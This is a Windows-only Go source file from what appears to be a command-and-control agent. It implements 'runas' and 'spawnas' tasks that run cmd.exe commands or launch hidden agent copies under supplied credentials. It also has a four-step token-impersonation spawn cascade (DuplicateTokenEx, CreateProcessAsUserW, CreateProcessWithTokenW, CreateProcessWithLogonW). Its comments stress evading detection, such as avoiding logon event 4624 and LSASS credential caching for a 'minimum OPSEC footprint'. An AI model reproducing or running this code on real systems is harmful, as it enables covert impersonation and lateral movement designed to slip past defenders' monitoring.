//go:build windows

package main

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"sort"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
	"unsafe"
)

// Windows API process creation procs (advapi32 is declared in make_token_windows.go).
var (
	procCreateProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
	spawnasKernel32             = syscall.NewLazyDLL("kernel32.dll")
	procCreatePipeK             = spawnasKernel32.NewProc("CreatePipe")
	procSetHandleInfo           = spawnasKernel32.NewProc("SetHandleInformation")
	procReadFileK               = spawnasKernel32.NewProc("ReadFile")
	procWaitSingleObject        = spawnasKernel32.NewProc("WaitForSingleObject")
	procCloseHandleK            = spawnasKernel32.NewProc("CloseHandle")
	procPeekNamedPipe           = spawnasKernel32.NewProc("PeekNamedPipe")
	procGetExitCodeProcess      = spawnasKernel32.NewProc("GetExitCodeProcess")
	procTerminateProcess        = spawnasKernel32.NewProc("TerminateProcess")
)

const (
	logonWithProfile        = 0x00000001
	createUnicodeEnv        = 0x00000400
	detachedProcessFlag     = 0x00000008
	startfUseStdHandles     = 0x00000100
	handleFlagInherit       = 0x00000001
	normalPriorityClassFlag = 0x00000020
	createNoWindow          = 0x08000000
)

// spawnasStartupInfoW mirrors STARTUPINFOW (104 bytes on 64-bit Windows).
// The Go alignment rules produce the correct layout:
//   - Cb (uint32, 4 bytes) + 4 bytes padding → offset 0
//   - _reserved (uintptr, 8 bytes) → offset 8
//     etc.
type spawnasStartupInfoW struct {
	Cb            uint32
	_reserved     uintptr
	Desktop       uintptr
	Title         uintptr
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	CbReserved2   uint16
	LpReserved2   uintptr
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
}

// spawnasProcessInformation mirrors PROCESS_INFORMATION.
type spawnasProcessInformation struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessId uint32
	ThreadId  uint32
}

// runasPayload carries a __RUNAS__ command's JSON body.
type runasPayload struct {
	Command  string `json:"command"`
	Domain   string `json:"domain"`
	User     string `json:"user"`
	Password string `json:"password"`
}

func parseRunasPayload(command string) (runasPayload, error) {
	var payload runasPayload
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 || strings.TrimSpace(parts[1]) == "" {
		return payload, errors.New("missing JSON payload")
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return payload, err
	}
	payload.Domain = strings.TrimSpace(payload.Domain)
	payload.User = strings.TrimSpace(payload.User)
	payload.Command = strings.TrimSpace(payload.Command)
	if payload.Domain == "" && strings.Contains(payload.User, `\`) {
		p := strings.SplitN(payload.User, `\`, 2)
		payload.Domain = strings.TrimSpace(p[0])
		payload.User = strings.TrimSpace(p[1])
	}
	if payload.User == "" {
		return payload, errors.New("user is required")
	}
	if payload.Command == "" {
		return payload, errors.New("command is required")
	}
	return payload, nil
}

// buildWindowsCmdLine builds a Windows-quoted command-line string from args.
func buildWindowsCmdLine(args []string) string {
	var sb strings.Builder
	for i, arg := range args {
		if i > 0 {
			sb.WriteByte(' ')
		}
		needsQuoting := strings.ContainsAny(arg, " \t\v\"") || arg == ""
		if !needsQuoting {
			sb.WriteString(arg)
			continue
		}
		sb.WriteByte('"')
		slashes := 0
		for _, c := range arg {
			switch c {
			case '\\':
				slashes++
			case '"':
				for j := 0; j < slashes; j++ {
					sb.WriteString(`\\`)
				}
				slashes = 0
				sb.WriteString(`\"`)
			default:
				for j := 0; j < slashes; j++ {
					sb.WriteByte('\\')
				}
				slashes = 0
				sb.WriteRune(c)
			}
		}
		for j := 0; j < slashes; j++ {
			sb.WriteString(`\\`)
		}
		sb.WriteByte('"')
	}
	return sb.String()
}

// buildEnvBlock converts []string env entries into a UTF-16 double-null-terminated block.
func buildEnvBlock(env []string) []uint16 {
	env = append([]string(nil), env...)
	sort.SliceStable(env, func(i, j int) bool { return strings.ToUpper(env[i]) < strings.ToUpper(env[j]) })
	var buf []uint16
	for _, kv := range env {
		buf = append(buf, utf16.Encode([]rune(kv))...)
		buf = append(buf, 0)
	}
	buf = append(buf, 0)
	if len(buf) == 1 {
		buf = append(buf, 0)
	}
	return buf
}

// createInheritablePipe creates an anonymous pipe with the write end inheritable.
// The read end is kept non-inheritable so the parent can drain it after the child exits.
func createInheritablePipe() (readH, writeH syscall.Handle, err error) {
	sa := struct {
		nLength              uint32
		lpSecurityDescriptor uintptr
		bInheritHandle       int32
	}{bInheritHandle: 1}
	sa.nLength = uint32(unsafe.Sizeof(sa))
	r, _, callErr := procCreatePipeK.Call(
		uintptr(unsafe.Pointer(&readH)),
		uintptr(unsafe.Pointer(&writeH)),
		uintptr(unsafe.Pointer(&sa)),
		0,
	)
	if r == 0 {
		return 0, 0, fmt.Errorf("CreatePipe: %w", callErr)
	}
	if ok, _, callErr := procSetHandleInfo.Call(uintptr(readH), handleFlagInherit, 0); ok == 0 {
		procCloseHandleK.Call(uintptr(readH))
		procCloseHandleK.Call(uintptr(writeH))
		return 0, 0, fmt.Errorf("SetHandleInformation: %w", callErr)
	}
	return readH, writeH, nil
}

// collectRunasOutput polls available output and immediate-child completion.
// After exit it drains only the queued-byte snapshot, never later descendant output.
func collectRunasOutput(ctx context.Context, process, pipe syscall.Handle) (string, error) {
	ops := runasOutputOps{
		stopped: func() (bool, error) {
			state, _, waitErr := procWaitSingleObject.Call(uintptr(process), 0)
			if state == 0 {
				return true, nil
			}
			if state == 258 {
				return false, nil
			} // WAIT_TIMEOUT
			return false, fmt.Errorf("WaitForSingleObject: %w", waitErr)
		},
		available: func() (uint32, error) {
			var available uint32
			ok, _, pipeErr := procPeekNamedPipe.Call(uintptr(pipe), 0, 0, 0, uintptr(unsafe.Pointer(&available)), 0)
			if ok == 0 && pipeErr != syscall.ERROR_BROKEN_PIPE {
				return 0, fmt.Errorf("PeekNamedPipe: %w", pipeErr)
			}
			return available, nil
		},
		read: func(buffer []byte) (uint32, error) {
			var n uint32
			ok, _, readErr := procReadFileK.Call(uintptr(pipe), uintptr(unsafe.Pointer(&buffer[0])), uintptr(len(buffer)), uintptr(unsafe.Pointer(&n)), 0)
			if ok == 0 {
				return 0, fmt.Errorf("ReadFile: %w", readErr)
			}
			return n, nil
		},
		exitCode: func() (uint32, error) {
			var exitCode uint32
			if ok, _, exitErr := procGetExitCodeProcess.Call(uintptr(process), uintptr(unsafe.Pointer(&exitCode))); ok == 0 {
				return 0, fmt.Errorf("GetExitCodeProcess: %w", exitErr)
			}
			return exitCode, nil
		},
		terminate: func() error {
			if ok, _, terminateErr := procTerminateProcess.Call(uintptr(process), 1); ok == 0 {
				if state, _, _ := procWaitSingleObject.Call(uintptr(process), 0); state != 0 {
					return fmt.Errorf("TerminateProcess: %w", terminateErr)
				}
			}
			procWaitSingleObject.Call(uintptr(process), 5000)
			return nil
		},
	}
	return collectRunasOutputWithOps(ctx, ops)
}

// logonCredentialPointers validates UTF-16 inputs and uses NULL domain for UPNs.
func logonCredentialPointers(user, domain, password string) (*uint16, *uint16, *uint16, error) {
	userPtr, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("encode user: %w", err)
	}
	var domainPtr *uint16
	if domain != "" {
		domainPtr, err = syscall.UTF16PtrFromString(domain)
		if err != nil {
			return nil, nil, nil, fmt.Errorf("encode domain: %w", err)
		}
	}
	passwordPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return nil, nil, nil, fmt.Errorf("encode password: %w", err)
	}
	return userPtr, domainPtr, passwordPtr, nil
}

// spawnWithLogonDetached starts an independent agent under explicit credentials.
func spawnWithLogonDetached(user, domain, password, executable string, args []string, envStrings []string) (uint32, error) {
	execPtr, err := syscall.UTF16PtrFromString(executable)
	if err != nil {
		return 0, fmt.Errorf("encode executable: %w", err)
	}
	cmdLineStr := buildWindowsCmdLine(args)
	cmdLine, err := syscall.UTF16PtrFromString(cmdLineStr)
	if err != nil {
		return 0, fmt.Errorf("encode command line: %w", err)
	}
	envBlock := buildEnvBlock(envStrings)
	si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{}))}
	var pi spawnasProcessInformation
	// Keep this child invisible without DETACHED_PROCESS, which the logon API rejects.
	flags := uint32(createUnicodeEnv | createNoWindow | normalPriorityClassFlag)

	// Explicit credentials select the requested process identity without token fallbacks.
	userPtr, domainPtr, passwordPtr, err := logonCredentialPointers(user, domain, password)
	if err != nil {
		return 0, err
	}
	ok, _, callErr := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		logonWithProfile,
		uintptr(unsafe.Pointer(execPtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(flags),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ok != 0 {
		pid := pi.ProcessId
		syscall.CloseHandle(pi.Process)
		syscall.CloseHandle(pi.Thread)
		return pid, nil
	}
	return 0, fmt.Errorf("CreateProcessWithLogonW: %w", callErr)
}

// runWithPipesLogonW calls CreateProcessWithLogonW with stdout/stderr redirected to pipes.
func runWithPipesLogonW(ctx context.Context, user, domain, password string, args []string, envBlock []uint16) (string, error) {
	if err := ctx.Err(); err != nil {
		return "", err
	}
	if len(args) == 0 || len(envBlock) == 0 {
		return "", errors.New("runas requires an executable and environment block")
	}
	userPtr, domainPtr, passwordPtr, err := logonCredentialPointers(user, domain, password)
	if err != nil {
		return "", err
	}
	execPtr, err := syscall.UTF16PtrFromString(args[0])
	if err != nil {
		return "", fmt.Errorf("encode executable: %w", err)
	}
	cmdLine, err := syscall.UTF16PtrFromString(buildWindowsCmdLine(args))
	if err != nil {
		return "", fmt.Errorf("encode command line: %w", err)
	}
	readH, writeH, err := createInheritablePipe()
	if err != nil {
		return "", err
	}
	defer procCloseHandleK.Call(uintptr(readH))

	si := spawnasStartupInfoW{
		Cb:        uint32(unsafe.Sizeof(spawnasStartupInfoW{})),
		Flags:     startfUseStdHandles,
		StdOutput: writeH,
		StdError:  writeH,
	}
	var pi spawnasProcessInformation
	flags := uint32(createUnicodeEnv | normalPriorityClassFlag)

	r, _, callErr := procCreateProcessWithLogonW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		logonWithProfile,
		uintptr(unsafe.Pointer(execPtr)),
		uintptr(unsafe.Pointer(cmdLine)),
		uintptr(flags),
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	procCloseHandleK.Call(uintptr(writeH))
	if r == 0 {
		return "", fmt.Errorf("CreateProcessWithLogonW: %w", callErr)
	}
	defer procCloseHandleK.Call(uintptr(pi.Process))
	defer procCloseHandleK.Call(uintptr(pi.Thread))
	out, err := collectRunasOutput(ctx, pi.Process, readH)
	if err != nil {
		// A pipe failure must not leave a running command behind after its
		// output handles are closed. Deadline cancellation already stops it.
		if state, _, _ := procWaitSingleObject.Call(uintptr(pi.Process), 0); state == 258 {
			procTerminateProcess.Call(uintptr(pi.Process), 1)
			procWaitSingleObject.Call(uintptr(pi.Process), 5000)
		}
	}
	return out, err
}

// spawnasCommand handles __SPAWNAS__: spawn a new agent copy under a different
// process identity using CreateProcessWithLogonW.
func spawnasCommand(command string, cfg *config) (string, error) {
	if memoryHosted() {
		return "", errMemoryHosted
	}
	payload, err := parseSpawnasPayload(command)
	if err != nil {
		return "", err
	}
	childConfig := *cfg
	sessionID := payload.SessionID
	if sessionID == "" {
		sessionID = derivedSessionID(cfg.SessionID, "spawnas")
	} else if !agentSessionIDPattern.MatchString(sessionID) || sessionID == cfg.SessionID {
		return "", errors.New("spawnas requires a fresh token-safe session ID")
	}
	if payload.WorkspaceID != nil {
		if *payload.WorkspaceID != "" && !agentWorkspaceIDPattern.MatchString(*payload.WorkspaceID) {
			return "", errors.New("invalid spawnas workspace ID")
		}
		childConfig.WorkspaceID = *payload.WorkspaceID
	}

	executable, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("resolve agent executable: %w", err)
	}
	envStrings := spawnEnvironment(&childConfig, sessionID)
	args := []string{executable}

	pid, err := spawnWithLogonDetached(payload.User, payload.Domain, payload.Password, executable, args, envStrings)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("spawned session=%s pid=%d identity=%s",
		sessionID, pid, identityLabel(payload.Domain, payload.User)), nil
}

// runasEnvironment builds the deliberately restricted environment for runas
// child processes. The child runs under a different identity and must not
// receive the agent's beacon credentials, session configuration, or arbitrary
// inherited variables. CreateProcessWithLogonW receives this exact environment
// block: LOGON_WITH_PROFILE loads the user's registry profile but does not add
// USERPROFILE, TEMP, APPDATA, or other per-user variables. Operators that need
// such values must set them explicitly in the command after resolving suitable
// paths under the target identity.
func runasEnvironment() []string {
	allowlist := map[string]bool{
		"SYSTEMROOT":  true,
		"SYSTEMDRIVE": true,
		"PATH":        true,
		"COMSPEC":     true,
		"WINDIR":      true,
		"PATHEXT":     true,
	}
	var env []string
	for _, entry := range os.Environ() {
		key, _, _ := strings.Cut(entry, "=")
		upper := strings.ToUpper(key)
		// Block all RMM_* keys unconditionally — they carry beacon secrets,
		// session identity, and proxy configuration.
		if strings.HasPrefix(upper, "RMM_") {
			continue
		}
		if allowlist[upper] {
			env = append(env, entry)
		}
	}
	return env
}

// runasCommand handles __RUNAS__: run a shell command under a different identity
// and return its output using CreateProcessWithLogonW.
func runasCommand(command string) (string, error) {
	payload, err := parseRunasPayload(command)
	if err != nil {
		return "", err
	}
	shellArgs := []string{`C:\Windows\System32\cmd.exe`, "/c", payload.Command}
	ctx, cancel := context.WithTimeout(agentContext, 120*time.Second)
	defer cancel()

	out, err := runWithPipesLogonW(ctx, payload.User, payload.Domain, payload.Password,
		shellArgs, buildEnvBlock(runasEnvironment()))
	if err != nil {
		return fmt.Sprintf("runas error: %v\noutput: %s", err, out), nil
	}
	return out, nil
}

var (
	procCreateProcessAsUserW    = advapi32.NewProc("CreateProcessAsUserW")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
)

const (
	// DuplicateTokenEx constants.
	tokenDuplicate        = 0x0002
	tokenQuery            = 0x0008
	tokenAssignPrimary    = 0x0001
	tokenImpersonate      = 0x0004
	securityImpersonation = 2
	tokenTypePrimary      = 1

	// CreateProcessWithTokenW logon flags.
	// LOGON_NETCREDENTIALS_ONLY (2) avoids profile loading and keeps the
	// netonly semantics quiet — no registry hive mount, no GPO folder
	// redirection, minimum OPSEC footprint.
	logonNetcredentialsOnly = 2
)

// duplicateTokenToPrimary creates a primary token from the make_token handle.
// The duplicate preserves the type-9 logon session, so the child inherits
// netonly semantics: local identity = agent, network identity = alternate.
// The caller must close the returned handle.
func duplicateTokenToPrimary(source syscall.Token) (syscall.Handle, error) {
	var primary syscall.Handle
	access := uint32(tokenDuplicate | tokenQuery | tokenAssignPrimary | tokenImpersonate)
	ok, _, err := procDuplicateTokenEx.Call(
		uintptr(source),
		uintptr(access),
		0, // default security attributes
		securityImpersonation,
		tokenTypePrimary,
		uintptr(unsafe.Pointer(&primary)),
	)
	if ok == 0 {
		return 0, fmt.Errorf("DuplicateTokenEx: %w", err)
	}
	return primary, nil
}

// startDetachedAgent implements the 4-echelon spawn cascade when a make_token
// identity is active:
//
//  1. CreateProcessAsUserW — duplicated primary token, needs SeAssignPrimaryTokenPrivilege.
//     Netonly: local = agent, network = alternate. No 4624, no LSASS.
//  2. CreateProcessWithTokenW — same token, needs SeImpersonatePrivilege.
//     Uses LOGON_NETCREDENTIALS_ONLY for minimum noise.
//  3. CreateProcessWithLogonW — plaintext creds, full type-2 logon.
//     WARNING: deposits credentials in LSASS.
//  4. CreateProcessA — agent identity, unconditional fallback.
//
// Without make_token, only echelon 4 runs.
func startDetachedAgent(command *exec.Cmd, diagnostics ...*spawnDiagnostics) (int, string, bool, credentialExposure, error) {
	tokenMu.Lock()
	token, active, credentials := activeToken, tokenActive, spawnCredentials
	// Snapshot the identity string under the same lock so diagnostics
	// never read mutable global state after unlock.
	identity := tokenIdentity
	// Duplicate the token to a primary token while we still hold tokenMu.
	// This eliminates the race where rev2self closes activeToken between
	// our unlock and a later DuplicateTokenEx call inside a closure.
	var ownedPrimary syscall.Handle
	tokenPropagationOK := false
	if active && token != 0 {
		var dupErr error
		ownedPrimary, dupErr = duplicateTokenToPrimary(token)
		if dupErr != nil {
			// Token duplication failed; propagation is unavailable but
			// credentials may still allow echelon 3.
			tokenPropagationOK = false
		} else {
			tokenPropagationOK = true
		}
	}
	tokenMu.Unlock()
	// active tracks whether the operator requested an alternate identity.
	// It stays true even if the token could not be duplicated — echelon 3
	// can still use stored credentials. tokenPropagationOK gates echelons 1 & 2.
	active = active && token != 0
	if ownedPrimary != 0 {
		defer syscall.CloseHandle(ownedPrimary)
	}
	hasCreds := active && credentials.user != ""
	line := buildWindowsCmdLine(command.Args)
	for _, entry := range command.Env {
		if strings.ContainsRune(entry, 0) {
			return 0, "", false, "", errors.New("invalid spawn environment")
		}
	}
	env := buildEnvBlock(command.Env)
	flags := uint32(createUnicodeEnv | createNoWindow | syscall.CREATE_NEW_PROCESS_GROUP)

	// Populate diagnostics using snapshotted values only. The network
	// identity was captured under tokenMu above; token queries use
	// ownedPrimary (our safe duplicate), never the original activeToken
	// which rev2self could close concurrently.
	if len(diagnostics) > 0 && diagnostics[0] != nil {
		detail := diagnostics[0]
		detail.ProcessIdentity = processUserIdentity()
		if active {
			detail.NetworkIdentity = identity
		}
		detail.ActiveToken, detail.CredentialsAvailable = active, hasCreds
		detail.CreationFlags, detail.TokenType = flags, "none"
		if processToken, openErr := syscall.OpenCurrentProcessToken(); openErr == nil {
			detail.ProcessPrivileges = spawnTokenPrivileges(processToken)
			_ = processToken.Close()
		}
		if ownedPrimary != 0 {
			detail.TokenType = spawnTokenType(syscall.Token(ownedPrimary))
			detail.TokenPrivileges = spawnTokenPrivileges(syscall.Token(ownedPrimary))
		}
	}

	// Encode paths once for the Unicode API calls (echelons 1 & 2).
	execPath := command.Path
	execPtr, encodeWideErr := syscall.UTF16PtrFromString(execPath)
	cmdLineWide, cmdLineWideErr := syscall.UTF16PtrFromString(line)
	// Compute the actual UTF-16 element count (including the null terminator)
	// by encoding the string properly. len(line)+1 counts UTF-8 bytes, NOT
	// UTF-16 code units, and would overread on non-ASCII paths.
	cmdLineWideSlice, _ := syscall.UTF16FromString(line)
	cmdLineWideLen := len(cmdLineWideSlice) // includes null terminator

	methods := spawnMethods{}

	// Echelon 1: CreateProcessAsUserW with pre-duplicated primary token.
	// ownedPrimary was duplicated under tokenMu above, so rev2self closing
	// activeToken cannot race with our handle.
	if tokenPropagationOK {
		methods.createProcessAsUser = func() (int, error) {
			if encodeWideErr != nil {
				return 0, encodeWideErr
			}
			if cmdLineWideErr != nil {
				return 0, cmdLineWideErr
			}
			if ownedPrimary == 0 {
				return 0, errors.New("token revoked before CreateProcessAsUserW")
			}
			// Re-duplicate so each echelon owns its own handle lifetime.
			// Convert Handle→Token for the duplicateTokenToPrimary signature.
			primary, dupErr := duplicateTokenToPrimary(syscall.Token(ownedPrimary))
			if dupErr != nil {
				return 0, dupErr
			}
			defer syscall.CloseHandle(primary)

			si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{}))}
			var pi spawnasProcessInformation
			// CreateProcessAsUserW may modify the command-line buffer.
			cmdLineCopy := make([]uint16, cmdLineWideLen)
			copy(cmdLineCopy, unsafe.Slice(cmdLineWide, cmdLineWideLen))

			ok, _, callErr := procCreateProcessAsUserW.Call(
				uintptr(primary),
				uintptr(unsafe.Pointer(execPtr)),
				uintptr(unsafe.Pointer(&cmdLineCopy[0])),
				0, 0, 0,
				uintptr(flags),
				uintptr(unsafe.Pointer(&env[0])),
				0,
				uintptr(unsafe.Pointer(&si)),
				uintptr(unsafe.Pointer(&pi)),
			)
			if ok == 0 {
				return 0, callErr
			}
			syscall.CloseHandle(pi.Thread)
			syscall.CloseHandle(pi.Process)
			return int(pi.ProcessId), nil
		}
	}

	// Echelon 2: CreateProcessWithTokenW.
	// Uses LOGON_NETCREDENTIALS_ONLY to minimise noise — no profile load,
	// token already carries the type-9 logon session.
	if tokenPropagationOK {
		methods.createProcessWithToken = func() (int, error) {
			if encodeWideErr != nil {
				return 0, encodeWideErr
			}
			if cmdLineWideErr != nil {
				return 0, cmdLineWideErr
			}
			if ownedPrimary == 0 {
				return 0, errors.New("token revoked before CreateProcessWithTokenW")
			}
			// Re-duplicate so each echelon owns its own handle lifetime.
			// Convert Handle→Token for the duplicateTokenToPrimary signature.
			primary, dupErr := duplicateTokenToPrimary(syscall.Token(ownedPrimary))
			if dupErr != nil {
				return 0, dupErr
			}
			defer syscall.CloseHandle(primary)

			si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{}))}
			var pi spawnasProcessInformation
			cmdLineCopy := make([]uint16, cmdLineWideLen)
			copy(cmdLineCopy, unsafe.Slice(cmdLineWide, cmdLineWideLen))

			ok, _, callErr := procCreateProcessWithTokenW.Call(
				uintptr(primary),
				logonNetcredentialsOnly,
				uintptr(unsafe.Pointer(execPtr)),
				uintptr(unsafe.Pointer(&cmdLineCopy[0])),
				uintptr(flags),
				uintptr(unsafe.Pointer(&env[0])),
				0,
				uintptr(unsafe.Pointer(&si)),
				uintptr(unsafe.Pointer(&pi)),
			)
			if ok == 0 {
				return 0, callErr
			}
			syscall.CloseHandle(pi.Thread)
			syscall.CloseHandle(pi.Process)
			return int(pi.ProcessId), nil
		}
	}

	// Echelon 3: CreateProcessWithLogonW with stored plaintext credentials.
	// This performs a real type-2 interactive logon — 4624 on the local box,
	// credentials cached in LSASS. Only used when echelons 1 and 2 fail.
	if hasCreds {
		methods.createProcessWithLogon = func() (int, error) {
			pid, logonErr := spawnWithLogonDetached(
				credentials.user, credentials.domain, credentials.password,
				execPath, command.Args, command.Env,
			)
			return int(pid), logonErr
		}
	}

	// Echelon 4: CreateProcessA — always available.
	methods.original = func() (int, error) {
		app, encodeErr := spawnANSI(command.Path)
		if encodeErr != nil {
			return 0, encodeErr
		}
		cmdLine, encodeErr := spawnANSI(line)
		if encodeErr != nil {
			return 0, encodeErr
		}
		si := spawnasStartupInfoW{Cb: uint32(unsafe.Sizeof(spawnasStartupInfoW{})), Flags: 1}
		var pi spawnasProcessInformation
		ok, _, callErr := spawnasKernel32.NewProc("CreateProcessA").Call(
			uintptr(unsafe.Pointer(&app[0])), uintptr(unsafe.Pointer(&cmdLine[0])), 0, 0, 0,
			uintptr(flags), uintptr(unsafe.Pointer(&env[0])), 0,
			uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
		if ok == 0 {
			return 0, callErr
		}
		_ = syscall.CloseHandle(pi.Thread)
		_ = syscall.CloseHandle(pi.Process)
		return int(pi.ProcessId), nil
	}

	return dispatchSpawn(active, hasCreds, methods, diagnostics...)
}

// spawnANSI converts paths and arguments to the system ANSI code page without
// silently substituting characters. CreateProcessA uses this encoding.
func spawnANSI(value string) ([]byte, error) {
	page, _, _ := spawnasKernel32.NewProc("GetACP").Call()
	if page == 65001 {
		return syscall.ByteSliceFromString(value)
	}
	wide, err := syscall.UTF16FromString(value)
	if err != nil {
		return nil, err
	}
	convert := spawnasKernel32.NewProc("WideCharToMultiByte")
	var substituted int32
	size, _, callErr := convert.Call(0, 0x400, uintptr(unsafe.Pointer(&wide[0])), uintptr(len(wide)),
		0, 0, 0, uintptr(unsafe.Pointer(&substituted)))
	if size == 0 {
		return nil, callErr
	}
	buffer := make([]byte, int(size))
	written, _, callErr := convert.Call(0, 0x400, uintptr(unsafe.Pointer(&wide[0])), uintptr(len(wide)),
		uintptr(unsafe.Pointer(&buffer[0])), size, 0, uintptr(unsafe.Pointer(&substituted)))
	if written == 0 {
		return nil, callErr
	}
	if substituted != 0 {
		return nil, errors.New("executable path cannot be represented by CreateProcessA")
	}
	return buffer, nil
}

// spawnTokenType reports the supplied handle's token kind without exposing it.
func spawnTokenType(token syscall.Token) string {
	var kind, size uint32
	ok, _, _ := advapi32.NewProc("GetTokenInformation").Call(uintptr(token), 8,
		uintptr(unsafe.Pointer(&kind)), 4, uintptr(unsafe.Pointer(&size)))
	if ok == 0 {
		return "unknown"
	}
	switch kind {
	case 1:
		return "primary"
	case 2:
		return "impersonation"
	}
	return "unknown"
}

// spawnTokenPrivileges captures only process-creation privilege names and state.
// It never enables privileges or includes token handles or credential material.
func spawnTokenPrivileges(token syscall.Token) map[string]string {
	names := []string{"SeAssignPrimaryTokenPrivilege", "SeIncreaseQuotaPrivilege", "SeImpersonatePrivilege"}
	states := map[string]string{}
	for _, name := range names {
		states[name] = "unknown"
	}
	query := advapi32.NewProc("GetTokenInformation")
	var size uint32
	query.Call(uintptr(token), 3, 0, 0, uintptr(unsafe.Pointer(&size)))
	if size < 4 || size > 1<<20 {
		return states
	}
	buffer := make([]byte, int(size))
	ok, _, _ := query.Call(uintptr(token), 3, uintptr(unsafe.Pointer(&buffer[0])), uintptr(size), uintptr(unsafe.Pointer(&size)))
	if ok == 0 {
		return states
	}
	count := binary.LittleEndian.Uint32(buffer[:4])
	if uint64(count)*12+4 > uint64(len(buffer)) {
		return states
	}
	for _, name := range names {
		text, _ := syscall.UTF16PtrFromString(name)
		var luid [2]uint32
		ok, _, _ := advapi32.NewProc("LookupPrivilegeValueW").Call(0,
			uintptr(unsafe.Pointer(text)), uintptr(unsafe.Pointer(&luid[0])))
		if ok == 0 {
			continue
		}
		states[name] = "absent"
		for i := uint32(0); i < count; i++ {
			offset := 4 + int(i)*12
			if binary.LittleEndian.Uint32(buffer[offset:]) != luid[0] || binary.LittleEndian.Uint32(buffer[offset+4:]) != luid[1] {
				continue
			}
			attributes := binary.LittleEndian.Uint32(buffer[offset+8:])
			states[name] = "disabled"
			if attributes&2 != 0 {
				states[name] = "enabled"
			}
			if attributes&4 != 0 {
				states[name] = "removed"
			}
			break
		}
	}
	return states
}
